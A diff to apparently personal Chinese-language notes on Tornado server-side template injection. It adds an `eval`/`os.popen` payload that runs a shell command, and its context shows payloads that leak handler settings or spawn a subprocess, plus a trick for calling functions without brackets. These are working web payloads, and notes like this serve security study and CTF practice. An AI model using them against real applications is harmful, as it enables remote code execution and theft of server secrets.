@@ -1,6 +1,7 @@
 # 常见payload
 	- ```python
 	  {{handler.settings}}
+	  {%raw eval('__import__("os").popen("ls /").read()')%}
 	  {{eval('[].__class__.__mro__[1].__subclasses__()[231]("ls",shell=1,stdout=-1).communicate()')}}
 	  ```
 - # 代码注入
@@ -12,7 +13,7 @@
 		- `{%extends xxx%}`
 		- `include`
 	- 括号
-		- `{%raw 114%}`输出表达式，配合apply可以实现函数调用绕过括号
+		- `{%raw 114%}`计算并输出表达式，配合apply可以实现函数调用绕过括号
 			- 可以直接将字符串传给eval
 			- `{%apply x.append%}{%raw {114:1}[k]%}{%end%}`
 		- `_tt_utf8`
